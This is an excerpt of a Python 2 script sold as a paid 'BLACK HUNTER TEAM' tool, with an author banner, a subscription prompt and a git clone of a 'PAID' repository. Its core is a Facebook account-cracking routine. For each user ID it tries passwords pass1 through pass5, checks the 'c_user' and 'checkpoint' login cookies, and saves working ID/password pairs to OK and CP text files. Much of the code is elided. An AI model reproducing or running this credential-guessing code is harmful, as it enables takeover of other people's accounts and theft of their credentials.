...
'\x1b[0;37m'   Author      :      BD JAHIED     
'\x1b[0;37m'   Group      :      BLACK HUNTER TEAM
'\x1b[0;37m'   FB ID       :      JAHIED HUSAIN
'\x1b[0;37m'   TOOL TYPE   :     PAID TOOL
'\x1b[0;37m'   WAP NUMBER  :    +8801747951169       
"""
dec="2"
server="2"
...
def main_apv():
    ...
    try:
        ...
        print ("           Admin Send Your Key Thanks")
        print ("           Subscription Enter Press")
        print ("           Or Whatsapp Send Now Thanks")
        print ("")
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("\x1b[0;37m        BH-TEAM Paid Commands ")
        print ("\x1b[0;37m        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/jahied/PAID")
    ...
    def main(arg):
		...
		try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;93m[BHT-OK] "+coc+user + " | " + pass1
                ok=open('BHT random-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[0;37m[BHT-CP] "+coc+user + " | " + pass1
                    cp=open('BHT random-cp.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
...
def mineExt():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;93m[BHT-OK] "+uid + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[0;37m[BHT-CP] "+uid + " | " + pass1
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;93m[BHT-OK] "+uid + " | " + pass2
                        ok=open('BHT-OK.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[0;37m[BHT-CP] "+uid + " | " + pass2
                            cp=open('BHT-CP.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;93m[BHT-OK] "+uid + " | " + pass3
                                ok=open('BHT-OK.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[0;37m[BHT-CP] "+uid + " | " + pass3
                                    cp=open('BHT-CP.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;93m[BHT-OK] "+uid + " | " + pass4
                                        ok=open('BHT-OK.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[0;37m[BHT-CP] "+uid + " | " + pass4
                                            cp=open('BHT-CP.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;93m[BHT-OK] "+uid + " | " + pass5
                                                ok=open('BHT-OK.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[0;37m[BHT-CP] "+uid + " | " + pass5
                                                    cp=open('BHT-CP.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
